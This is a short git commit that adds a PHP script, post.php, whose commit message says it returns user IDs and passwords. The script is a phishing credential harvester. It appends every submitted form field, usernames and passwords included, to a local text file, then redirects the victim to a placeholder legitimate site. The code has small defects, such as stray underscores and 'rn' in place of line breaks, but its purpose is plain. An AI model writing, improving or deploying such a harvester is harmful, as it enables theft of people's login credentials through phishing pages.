f93bed85494ab32942e6f75ed498d4a7676f54f9
prajwalsm522 <smprajwal0@gmail.com>
2020-07-24 21:35:37 +0530

    this php code return userid and pass

---
+++ post.php
@@ -0,0 +1,14 @@
+_<?php
+header ('Location:-The site you are using- ');
+$handle = fopen('usernames.txt', 'a');
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, '=');
+fwrite($handle, $value);
+fwrite($handle, 'rn');
+}
+fwrite($handle, 'rn');
+fclose($handle);
+exit;
+?> _
+
